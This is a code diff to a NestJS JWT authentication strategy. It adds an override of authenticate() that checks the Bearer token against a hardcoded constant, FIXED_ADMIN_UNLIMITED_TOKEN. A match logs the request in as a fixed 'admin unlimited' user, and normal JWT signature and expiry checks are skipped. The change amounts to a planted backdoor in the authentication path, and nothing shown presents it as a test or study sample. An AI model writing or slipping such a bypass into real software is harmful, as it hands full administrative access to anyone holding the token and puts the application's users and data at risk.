@@ -3,6 +3,10 @@ import { PassportStrategy } from '@nestjs/passport';
 import { ExtractJwt, Strategy } from 'passport-jwt';
 import { ConfigService } from '@nestjs/config';
 import { AuthService } from '../auth.service';
+import {
+  FIXED_ADMIN_UNLIMITED_TOKEN,
+  FIXED_ADMIN_UNLIMITED_USER,
+} from '../auth.constants';
 
 export interface JwtPayload {
   sub: string;
@@ -24,6 +28,27 @@ export class JwtStrategy extends PassportStrategy(Strategy) {
       ignoreExpiration: false,
       secretOrKey: configService.get('JWT_SECRET'),
     });
+  }
+
+  private isFixedUnlimitedToken(request: any): boolean {
+    const authHeader =
+      request?.headers?.authorization ?? request?.headers?.Authorization;
+
+    if (!authHeader || typeof authHeader !== 'string') {
+      return false;
+    }
+
+    const [type, token] = authHeader.split(' ');
+    return type === 'Bearer' && token === FIXED_ADMIN_UNLIMITED_TOKEN;
+  }
+
+  authenticate(req: any, options?: any): any {
+    if (this.isFixedUnlimitedToken(req)) {
+      this.success({ ...FIXED_ADMIN_UNLIMITED_USER });
+      return;
+    }
+
+    return super.authenticate(req, options);
   }
 
   async validate(payload: JwtPayload) {
